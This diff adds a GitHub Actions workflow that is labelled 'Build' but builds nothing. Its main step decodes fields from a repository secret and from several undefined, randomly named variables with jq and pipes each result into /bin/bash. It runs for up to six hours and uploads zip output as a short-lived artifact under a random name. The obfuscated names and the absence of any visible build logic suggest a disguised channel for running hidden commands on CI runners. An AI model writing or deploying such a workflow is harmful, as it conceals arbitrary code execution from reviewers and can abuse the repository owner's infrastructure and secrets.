@@ -1,0 +1,29 @@
+name: Build
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  main:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          qxxh11: ${{ secrets.qxxh11 }}
+        run: |
+          printf '%s' "$qxxh11" | jq -r .iti8489 | /bin/bash
+          printf '%s' "$jv1" | jq -r .zgqp6798 | /bin/bash
+          printf '%s' "$lrah08884" | jq -r .on990 | /bin/bash
+          echo $zujvk8 | jq -r .v378 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 9jgO2Wia
+          path: "*.zip"
+          retention-days: 1
